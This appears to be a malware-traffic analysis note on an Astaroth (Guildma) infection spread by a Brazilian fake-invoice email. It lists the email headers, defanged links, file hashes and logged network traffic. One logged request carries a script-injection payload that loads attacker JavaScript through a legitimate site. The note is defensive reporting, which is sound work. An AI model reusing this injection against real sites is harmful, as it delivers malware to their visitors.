@@ -1,0 +1,72 @@
+2022-09-21 (WEDNESDAY): ASTAROTH (GUILDMA) INFECTION FROM BRASIL EMAIL
+
+EMAIL HEADER INFORMATION:
+
+- Received: from notice01.c3eng.com.br (notice01.c3eng.com.br [5.181.77.76])
+- Date: Wed, 21 Sep 2022 09:54:11 -0300
+- Subject: NF-e: 0007886461107886463  Emitente: 4370000461768 - Fast Shop Comercial S.A  Pedido: 1157444TM45
+- From: fastshop <mail@notice01.c3eng.com.br>
+
+LINKS FROM THE MESSAGE TEXT:
+
+- hxxp://wraa5f.assessirianricoadvocacia[.]cloud/C13iXUN4XvrC3/lzXQFOhWzChrNh646U9/N3GF9LV7KP9NHNP4T2L3K9EU6HEK1/Visualizar_NFe35000012022202382673
+
+- hxxp://wraa5f.assessirianricoadvocacia[.]cloud/C13iXUN4XvrC3/lzXQFOhWzChrNh646U9/N3GF9LV7KP9NHNP4T2L3K9EU6HEK1/doc_67307923116000141_001
+
+ASSOCIATED MALWARE FROM THE INFECTION:
+
+DOWNLOADED ZIP ARCHIVE:
+
+- SHA256 hash: 59f442b2bb4b22c7329ffadf12266e275a095d88067b82ea3012bd37c5175bf6
+- File size: 1,114 bytes
+- File name: Visualizar_NFe35000012022202382673_953.80768.48080.zip
+
+CONTENTS OF DOWNLOADED ZIP ARHCIVE (2 ITEMS):
+
+- SHA256 hash: 1dc5727b1873979ae35de8208fb0e60df936ec1517aa323d4b807b482920a0b6
+- File size: 333 bytes
+- File name: Visualizar_NFe35000012022202382673_953.80768796.861865.87368.cmd
+- 
+- SHA256 hash: c8cf3741d399a0a038386555ea22a788754597e7d3429d3a505cbeaea12979e5
+- File size: 1,323 bytes
+- File name: Visualizar_NFe35000012022202382673_953.80768796.861865.87368.lNk
+
+MALICIOUS AUTOIT3 COMPILED SCRIPT:
+
+- SHA256 hash: 6b9d42147ba4c4053bb26950e5c359d529f8c05473d28f5b9c7eb35d745bbeff
+- File size: 244,658 bytes
+- File name: C:\W37604745254\Asus.Getnet.2022.1718.577.AutoIt3.log
+- File type: AutoIt v3 compiled script
+- Note: Run through shortcut in the infection users startup menu directory using copy of AutoIt3.exe
+
+TRAFFIC FROM THE INFECTION:
+
+- 172.67.221[.]34:80 - wraa5f.assessirianricoadvocacia[.]cloud - GET /C13iXUN4XvrC3/lzXQFOhWzChrNh646U9/N3GF9LV7KP9NHNP4T2L3K9EU6HEK1/Visualizar_NFe35000012022202382673
+
+- 38.86.171[.]155:80 - www.creditcardflyers[.]com - GET /credit-card-news/tag.php?tag=%3Cscript%20src=%22https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js%22%3E%3C/script%3E%3Cscript%20type=%22text/javascript%22%20src=%22hxxp://wraa5f.assessirianricoadvocacia[.]cloud/C13iXUN4XvrC3/lzXQFOhWzChrNh646U9/N3GF9LV7KP9NHNP4T2L3K9EU6HEK1/Visualizar_NFe35000012022202382673AvDk.T036%22%3E%3C/script%3E?
+
+- NOTE: www.creditcardflyers[.]com is a legitimate site exploited for this infection chain.
+
+- 172.67.221[.]34:80 - wraa5f.assessirianricoadvocacia[.]cloud - GET /C13iXUN4XvrC3/lzXQFOhWzChrNh646U9/N3GF9LV7KP9NHNP4T2L3K9EU6HEK1/Visualizar_NFe35000012022202382673AvDk.T036
+
+- 172.67.221[.]34:80 - wraa5f.assessirianricoadvocacia[.]cloud - GET //inc.php?/Visualizar_NFe35000012022202382673
+
+- 172.67.221[.]34:80 - wraa5f.assessirianricoadvocacia[.]cloud - GET /TGGZXKNFF/QZ651XX32JB7/WV4YX6/Visualizar_NFe35000012022202382673_953.80768.48080z64y64
+
+- 172.67.199[.]222:80 - yiuahd.sophiaemarlibuffetme[.]link - GET /?1/
+- 104.21.50[.]34:80 - f4iidk.felipeemarlimarketingl[.]link - HEAD /?41121051535628719
+- 104.21.50[.]34:80 - f4iidk.felipeemarlimarketingl[.]link - GET /?41121051535628719
+- 104.21.50[.]34:80 - f4iidk.felipeemarlimarketingl[.]link - HEAD /?35754428508632973
+- 104.21.50[.]34:80 - f4iidk.felipeemarlimarketingl[.]link - GET /?35754428508632973
+- 104.21.50[.]34:80 - f4iidk.felipeemarlimarketingl[.]link - HEAD /?50488578823639031
+- 104.21.50[.]34:80 - f4iidk.felipeemarlimarketingl[.]link - GET /?50488578823639031
+- 104.21.50[.]34:80 - f4iidk.felipeemarlimarketingl[.]link - HEAD /?44584396660678013
+- 104.21.50[.]34:80 - f4iidk.felipeemarlimarketingl[.]link - GET /?44584396660678013
+- 104.21.50[.]34:80 - f4iidk.felipeemarlimarketingl[.]link - HEAD /?50551904024693631
+- 104.21.50[.]34:80 - f4iidk.felipeemarlimarketingl[.]link - GET /?50551904024693631
+- 104.21.50[.]34:80 - f4iidk.felipeemarlimarketingl[.]link - HEAD /?77015596620613945
+- 104.21.50[.]34:80 - f4iidk.felipeemarlimarketingl[.]link - GET /?77015596620613945
+
+- 172.67.200[.]87:80 - vjur2fho2j3.clus[.]ga - POST /
+- 172.67.200[.]87:80 - vjur2fho2j3.clus[.]ga - POST /
+- 104.21.21[.]208:80 - vjur2fho2j3.clus[.]ga - POST /
